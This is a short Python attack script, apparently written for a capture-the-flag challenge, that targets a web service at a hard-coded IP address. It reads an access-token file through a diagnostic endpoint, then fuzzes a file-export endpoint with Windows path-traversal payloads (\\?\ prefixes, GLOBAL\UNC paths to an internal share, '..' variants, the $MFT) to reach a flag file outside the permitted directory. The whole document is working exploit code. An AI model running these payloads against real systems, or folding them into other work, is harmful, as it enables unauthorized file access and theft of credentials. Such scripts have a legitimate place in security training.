import requests
import time

BASE_URL = "http://1.95.51.2:8080"

def get_token():
    try:
        r = requests.get(f"{BASE_URL}/api/diag/read", params={"path": r"\\?\C:\token\access_key.txt"}, timeout=5)
        if r.status_code == 200:
            return r.json().get("token")
    except:
        pass
    return None

def check(path, tok=None):
    if not tok: tok = get_token()
    if not tok: return
    try:
        r = requests.get(f"{BASE_URL}/api/export/read", params={"path": path, "token": tok}, timeout=5)
        print(f"Path: {path} -> {r.status_code}")
        print(f"Resp: {r.text[:200]}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    t = get_token()
    
    # Try D: system files
    check(r"\\?\D:\$MFT", t)
    
    # Try Drive Relative syntax
    check(r"\\?\C:Global\UNC\172.20.0.10\backup\flag.txt", t)
    check(fr"\\?\C:GLOBAL\UNC\172.20.0.10\backup\flag.txt", t)
    
    # Try Traversal fuzzing
    payloads = [
        r"\\?\C:\..\Global\UNC\172.20.0.10\backup\flag.txt",
        r"\\?\C:\/..\Global\UNC\172.20.0.10\backup\flag.txt",
        r"\\?\C:\.\..\Global\UNC\172.20.0.10\backup\flag.txt",
        r"\\?\C:\.. \Global\UNC\172.20.0.10\backup\flag.txt",
        r"\\?\C:\..\.\Global\UNC\172.20.0.10\backup\flag.txt",
        r"\\?\C:\...\Global\UNC\172.20.0.10\backup\flag.txt",
        r"\\?\C:\Foo\..\Global\UNC\172.20.0.10\backup\flag.txt",
        r"\\?\C:\Boot.ini\..\Global\UNC\172.20.0.10\backup\flag.txt"
    ]
    for p in payloads:
        check(p, t)
